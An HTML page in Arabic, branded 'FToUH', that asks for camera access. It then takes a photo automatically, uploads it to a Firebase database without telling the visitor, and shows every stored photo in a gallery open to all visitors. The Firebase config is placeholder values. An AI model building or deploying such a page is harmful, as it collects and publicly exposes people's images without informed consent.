<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FToUH</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
    <style>
        /* CSS - الجزء الأول */
        :root {
            --dark-blue: #000033;
            --blood-blue: #3300cc;
            --neon-blue: #00ccff;
            --dark: #000000;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: var(--dark);
            color: white;
            overflow: hidden;
            height: 100vh;
            position: relative;
        }

        /* تأثير النقاط الزرقاء المتساقطة */
        .snowfall {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .snowflake {
            position: absolute;
            background-color: var(--neon-blue);
            border-radius: 50%;
            filter: blur(1px);
            animation: falling linear infinite;
            opacity: 0.8;
        }

        @keyframes falling {
            0% {
                transform: translateY(-10px) rotate(0deg);
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
            }
        }

        /* الشريط العلوي */
        .header {
            position: relative;
            z-index: 10;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(90deg, rgba(0,0,0,0.8) 0%, rgba(51,0,204,0.5) 100%);
            border-bottom: 2px solid var(--blood-blue);
        }

        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--blood-blue);
            text-shadow: 0 0 10px var(--neon-blue), 
                         0 0 20px var(--neon-blue),
                         0 0 30px var(--neon-blue);
            animation: pulse 2s infinite alternate;
        }

        @keyframes pulse {
            0% {
                text-shadow: 0 0 10px var(--neon-blue);
            }
            100% {
                text-shadow: 0 0 20px var(--neon-blue), 
                            0 0 40px var(--neon-blue),
                            0 0 60px var(--neon-blue);
            }
        }

        /* زر Ya Mibon */
        .camera-btn {
            background: linear-gradient(45deg, var(--blood-blue), var(--neon-blue));
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 30px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            z-index: 5;
            box-shadow: 0 0 15px var(--neon-blue);
            transition: all 0.3s;
        }

        .camera-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 25px var(--neon-blue);
        }

        .camera-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                transparent, transparent, transparent,
                rgba(0, 204, 255, 0.1), transparent, transparent
            );
            transform: rotate(30deg);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% {
                left: -50%;
            }
            100% {
                left: 150%;
            }
        }

        /* نافذة الإذن */
        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s;
            backdrop-filter: blur(10px);
        }

        .permission-modal.active {
            opacity: 1;
            pointer-events: all;
        }

        .permission-box {
            background: linear-gradient(135deg, rgba(0,0,51,0.8), rgba(0,0,0,0.9));
            padding: 30px;
            border-radius: 20px;
            width: 90%;
            max-width: 500px;
            text-align: center;
            border: 2px solid var(--blood-blue);
            box-shadow: 0 0 30px var(--neon-blue);
            transform: scale(0.8);
            transition: transform 0.5s;
            position: relative;
            overflow: hidden;
        }

        .permission-modal.active .permission-box {
            transform: scale(1);
        }

        .permission-box::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(
                45deg,
                var(--blood-blue),
                var(--neon-blue),
                var(--blood-blue)
            );
            z-index: -1;
            border-radius: 20px;
            animation: borderGlow 3s linear infinite;
            background-size: 400%;
        }

        @keyframes borderGlow {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        .permission-text {
            font-size: 1.3rem;
            margin-bottom: 30px;
            color: white;
            line-height: 1.6;
        }

        .permission-btns {
            display: flex;
            justify-content: center;
            gap: 20px;
        }

        .permission-btn {
            padding: 12px 30px;
            border-radius: 30px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            border: none;
        }

        .allow-btn {
            background: linear-gradient(45deg, var(--neon-blue), var(--blood-blue));
            color: white;
            box-shadow: 0 0 15px var(--neon-blue);
        }

        .deny-btn {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .allow-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 25px var(--neon-blue);
        }

        .deny-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        /* منطقة عرض الصورة */
        .camera-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 200;
            width: 90%;
            max-width: 600px;
            display: none;
        }

        .camera-video {
            width: 100%;
            border-radius: 15px;
            border: 3px solid var(--blood-blue);
            box-shadow: 0 0 30px var(--neon-blue);
            display: none;
        }

        .captured-image {
            width: 100%;
            border-radius: 15px;
            border: 3px solid var(--blood-blue);
            box-shadow: 0 0 30px var(--neon-blue);
            display: none;
        }

        .gallery {
            position: fixed;
            bottom: 20px;
            left: 0;
            width: 100%;
            padding: 20px;
            display: flex;
            overflow-x: auto;
            gap: 15px;
            z-index: 50;
        }

        .gallery-item {
            min-width: 100px;
            height: 100px;
            border-radius: 10px;
            border: 2px solid var(--blood-blue);
            object-fit: cover;
            transition: all 0.3s;
            cursor: pointer;
            box-shadow: 0 0 10px var(--neon-blue);
        }

        .gallery-item:hover {
            transform: translateY(-10px);
            box-shadow: 0 0 20px var(--neon-blue);
        }

        /* تأثيرات GSAP إضافية */
        .particle {
            position: absolute;
            background-color: var(--neon-blue);
            border-radius: 50%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <!-- تأثير النقاط الزرقاء -->
    <div class="snowfall" id="snowfall"></div>

    <!-- الشريط العلوي -->
    <div class="header">
        <div class="logo">FToUH</div>
        <button class="camera-btn" id="cameraBtn">ya mibon</button>
    </div>

    <!-- نافذة طلب الإذن -->
    <div class="permission-modal" id="permissionModal">
        <div class="permission-box">
            <div class="permission-text">
                هل تسمح ل Fateh بأخذ إذن الوصول إلى الكاميرا؟
                <br>
                سيتم استخدامها لالتقاط صورة واحدة فقط
            </div>
            <div class="permission-btns">
                <button class="permission-btn allow-btn" id="allowBtn">سماح</button>
                <button class="permission-btn deny-btn" id="denyBtn">رفض</button>
            </div>
        </div>
    </div>

    <!-- منطقة الكاميرا -->
    <div class="camera-container" id="cameraContainer">
        <video class="camera-video" id="cameraVideo" autoplay playsinline></video>
        <canvas id="cameraCanvas" style="display:none;"></canvas>
        <img class="captured-image" id="capturedImage" alt="الصورة الملتقطة">
    </div>

    <!-- معرض الصور -->
    <div class="gallery" id="gallery"></div>

    <!-- JavaScript -->
    <script>
        // Firebase configuration - استبدل بقيمك الخاصة
        const firebaseConfig = {
            apiKey: "AIzaSyABC123YOUR_API_KEY",
            authDomain: "your-project.firebaseapp.com",
            databaseURL: "https://your-project.firebaseio.com",
            projectId: "your-project",
            storageBucket: "your-project.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "1:YOUR_APP_ID"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        document.addEventListener('DOMContentLoaded', function() {
            // عناصر DOM
            const cameraBtn = document.getElementById('cameraBtn');
            const permissionModal = document.getElementById('permissionModal');
            const allowBtn = document.getElementById('allowBtn');
            const denyBtn = document.getElementById('denyBtn');
            const cameraContainer = document.getElementById('cameraContainer');
            const cameraVideo = document.getElementById('cameraVideo');
            const cameraCanvas = document.getElementById('cameraCanvas');
            const capturedImage = document.getElementById('capturedImage');
            const gallery = document.getElementById('gallery');
            const snowfall = document.getElementById('snowfall');

            // إنشاء تأثير النقاط الزرقاء
            function createSnowfall() {
                const snowflakeCount = 100;
                
                for (let i = 0; i < snowflakeCount; i++) {
                    const snowflake = document.createElement('div');
                    snowflake.classList.add('snowflake');
                    
                    // أحجام وأوقات عشوائية
                    const size = Math.random() * 5 + 2;
                    const left = Math.random() * 100;
                    const animationDuration = Math.random() * 10 + 5;
                    const animationDelay = Math.random() * 10;
                    const opacity = Math.random() * 0.7 + 0.3;
                    
                    snowflake.style.width = `${size}px`;
                    snowflake.style.height = `${size}px`;
                    snowflake.style.left = `${left}%`;
                    snowflake.style.animationDuration = `${animationDuration}s`;
                    snowflake.style.animationDelay = `${animationDelay}s`;
                    snowflake.style.opacity = opacity;
                    
                    snowfall.appendChild(snowflake);
                }
            }

            // تأثيرات GSAP عند التحميل
            function initAnimations() {
                // تأثير اهتزاز للزر
                gsap.to(cameraBtn, {
                    y: -5,
                    duration: 1,
                    repeat: -1,
                    yoyo: true,
                    ease: "sine.inOut"
                });

                // تأثير نبض للشعار
                gsap.to(".logo", {
                    scale: 1.05,
                    duration: 2,
                    repeat: -1,
                    yoyo: true,
                    ease: "power1.inOut"
                });
            }

            // طلب إذن الكاميرا
            cameraBtn.addEventListener('click', () => {
                permissionModal.classList.add('active');
                
                // تأثير GSAP للنافذة
                gsap.from(".permission-box", {
                    scale: 0.5,
                    opacity: 0,
                    duration: 0.5,
                    ease: "back.out(1.7)"
                });
            });

            // السماح بالوصول إلى الكاميرا
            allowBtn.addEventListener('click', async () => {
                permissionModal.classList.remove('active');
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    cameraContainer.style.display = 'block';
                    cameraVideo.style.display = 'block';
                    cameraVideo.srcObject = stream;
                    
                    // عرض تأثير GSAP للكاميرا
                    gsap.from(cameraContainer, {
                        scale: 0.8,
                        opacity: 0,
                        duration: 0.7,
                        ease: "elastic.out(1, 0.5)"
                    });
                    
                    // بعد 3 ثوانٍ، التقاط صورة تلقائياً
                    setTimeout(captureImage, 3000);
                    
                } catch (error) {
                    console.error("Error accessing camera:", error);
                    alert("حدث خطأ في الوصول إلى الكاميرا");
                }
            });

            // رفض الوصول إلى الكاميرا
            denyBtn.addEventListener('click', () => {
                permissionModal.classList.remove('active');
                
                // تأثير GSAP للرفض
                gsap.to(".permission-box", {
                    x: 50,
                    opacity: 0,
                    duration: 0.5,
                    ease: "back.in(1.7)",
                    onComplete: () => {
                        permissionModal.classList.remove('active');
                        gsap.set(".permission-box", { x: 0, opacity: 1 });
                    }
                });
            });

            // التقاط صورة
            function captureImage() {
                const context = cameraCanvas.getContext('2d');
                cameraCanvas.width = cameraVideo.videoWidth;
                cameraCanvas.height = cameraVideo.videoHeight;
                context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
                
                const imageDataUrl = cameraCanvas.toDataURL('image/png');
                capturedImage.src = imageDataUrl;
                cameraVideo.style.display = 'none';
                capturedImage.style.display = 'block';
                
                // إيقاف بث الكاميرا
                cameraVideo.srcObject.getTracks().forEach(track => track.stop());
                
                // حفظ الصورة في Firebase
                saveImageToDatabase(imageDataUrl);
                
                // تأثير GSAP للصورة الملتقطة
                gsap.from(capturedImage, {
                    scale: 0.5,
                    rotation: 360,
                    duration: 1.5,
                    ease: "elastic.out(1, 0.5)"
                });
                
                // إنشاء جسيمات متطايرة
                createParticles();
            }

            // حفظ الصورة في قاعدة البيانات
            function saveImageToDatabase(imageUrl) {
                const timestamp = new Date().getTime();
                database.ref('captured-images/' + timestamp).set({
                    imageUrl: imageUrl,
                    timestamp: timestamp
                });
            }

            // تحميل الصور من قاعدة البيانات
            function loadImagesFromDatabase() {
                database.ref('captured-images').on('value', (snapshot) => {
                    gallery.innerHTML = '';
                    const images = snapshot.val();
                    
                    if (images) {
                        Object.keys(images).forEach(key => {
                            const img = document.createElement('img');
                            img.classList.add('gallery-item');
                            img.src = images[key].imageUrl;
                            gallery.appendChild(img);
                            
                            // تأثير GSAP لعناصر المعرض
                            gsap.from(img, {
                                x: 100,
                                opacity: 0,
                                duration: 0.7,
                                delay: Math.random() * 0.5
                            });
                        });
                    }
                });
            }

            // إنشاء جسيمات متطايرة
            function createParticles() {
                const particleCount = 50;
                
                for (let i = 0; i < particleCount; i++) {
                    const particle = document.createElement('div');
                    particle.classList.add('particle');
                    
                    // تحديد موقع الجسيمات حول الصورة
                    const size = Math.random() * 15 + 5;
                    const x = capturedImage.offsetLeft + Math.random() * capturedImage.offsetWidth;
                    const y = capturedImage.offsetTop + Math.random() * capturedImage.offsetHeight;
                    const color = `hsl(${Math.random() * 60 + 200}, 100%, 50%)`;
                    
                    particle.style.width = `${size}px`;
                    particle.style.height = `${size}px`;
                    particle.style.left = `${x}px`;
                    particle.style.top = `${y}px`;
                    particle.style.backgroundColor = color;
                    
                    document.body.appendChild(particle);
                    
                    // تحريك الجسيمات باستخدام GSAP
                    gsap.to(particle, {
                        x: (Math.random() - 0.5) * 500,
                        y: (Math.random() - 0.5) * 500,
                        opacity: 0,
                        scale: 0,
                        duration: Math.random() * 2 + 1,
                        onComplete: () => {
                            particle.remove();
                        }
                    });
                }
            }

            // تهيئة التطبيق
            createSnowfall();
            initAnimations();
            loadImagesFromDatabase();
        });
    </script>
</body>
</html>
